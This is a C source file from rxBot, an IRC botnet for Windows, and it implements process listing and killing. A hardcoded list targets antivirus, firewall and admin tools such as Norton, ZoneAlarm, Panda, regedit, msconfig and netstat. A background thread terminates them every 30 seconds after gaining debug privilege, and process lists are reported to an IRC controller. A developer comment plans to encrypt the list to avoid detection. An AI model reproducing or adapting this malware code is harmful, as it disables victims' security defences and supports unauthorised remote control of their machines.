/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_PROCESS

// globals
#ifndef NO_AVFW_KILL
int killer_delay = 30000;

//FIX ME, ENCRYPT THESE!! Make this global
char *kill_list[]={
	"regedit.exe",
	"msconfig.exe",
	"netstat.exe",
	"msblast.exe",
	"zapro.exe",
	"navw32.exe",
	"navapw32.exe",
	"zonealarm.exe",
	"wincfg32.exe"
	"taskmon.exe",
	"PandaAVEngine.exe",
	"sysinfo.exe",
	"mscvb32.exe",
	"MSBLAST.exe",
	"teekids.exe",
	"Penis32.exe",
	"bbeagle.exe",
	"SysMonXP.exe", 
	"winupd.exe",
	"winsys.exe",
	"ssate.exe",
	"rate.exe",
	"d3dupdate.exe",
	"irun4.exe",
	"i11r54n4.exe"
};
#endif

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread, BOOL full)
{
	char sendbuf[IRCLINE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};
	
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		AdjustPrivileges(SE_DEBUG_NAME, TRUE);
		if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hProcess, &pe32)) {
				while (fProcess32Next(hProcess, &pe32)) {
					if (killthread) {
						#ifndef NO_AVFW_KILL
						for(int c = 0;c < (sizeof(kill_list) / sizeof(LPTSTR));c++) {
							if (lstrcmpi(pe32.szExeFile,kill_list[c]) == 0) {
 								if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID))
									if (!TerminateProcess(hProcess2,0))
										CloseHandle(hProcess2);

								break;
							}
						}
						#endif
					}
					else if (!proccess) {
						if (chan) {
							hProcess2 = fCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe32.th32ProcessID);
							me32.dwSize = sizeof(MODULEENTRY32);
							if (full) {
								if (fModule32First(hProcess2, &me32))
									sprintf(sendbuf," %s (%d)",me32.szExePath,pe32.th32ProcessID);
								else
									sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							} else
								sprintf(sendbuf," %s (%d)",pe32.szExeFile,pe32.th32ProcessID);
							irc_privmsg(sock,chan,sendbuf,notice,TRUE);
							CloseHandle(hProcess2);
						}
					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							hProcess2 = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hProcess);

							if (!TerminateProcess(hProcess2,0)) {
								CloseHandle(hProcess2);

								return 0;
							}
							return 1;
						 }
					}
				} 
			}
			CloseHandle(hProcess);
		}
		AdjustPrivileges(SE_DEBUG_NAME, FALSE);
	}

 	return 0;
}

DWORD WINAPI listProcessesThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	LPROC lproc = *((LPROC *)param);
	LPROC *lprocp = (LPROC *)param;
	lprocp->gotinfo = TRUE;

	sprintf(sendbuf,"[PROC]: Listing processes:");
	if (!lproc.silent) irc_privmsg(lproc.sock,lproc.chan,sendbuf,lproc.notice);
	
	if (listProcesses(lproc.sock,lproc.chan,lproc.notice,NULL, FALSE, lproc.full) == 0)
		sprintf(sendbuf,"[PROC]: Process list completed.");
	else 
		sprintf(sendbuf,"[PROC]: Process list failed.");

	if (!lproc.silent) irc_privmsg(lproc.sock, lproc.chan, sendbuf, lproc.notice);
	addlog(sendbuf);

	clearthread(lproc.threadnum);

	ExitThread(0);
}

#ifndef NO_AVFW_KILL
DWORD WINAPI KillAVThread(LPVOID param)
{
	int threadnum = (int)param;

	while (1) {
		listProcesses(0,NULL,NULL,FALSE,NULL,TRUE);
		Sleep(killer_delay);
	}
	clearthread(threadnum);

	ExitThread(0);
}
#endif
#endif

int killProcess(int pid)
{
	int ret=1;

 	HANDLE pHandle;
	
	if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) != NULL)
		if(!TerminateProcess(pHandle,0)) {
			ret=0;
			CloseHandle(pHandle);
		}

	return ret;
}

BOOL AdjustPrivileges(char *pPriv, BOOL add)
{
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!fOpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!fLookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1; 
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else 
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=fAdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);
	
	CloseHandle(hToken);

	return bRet;
}
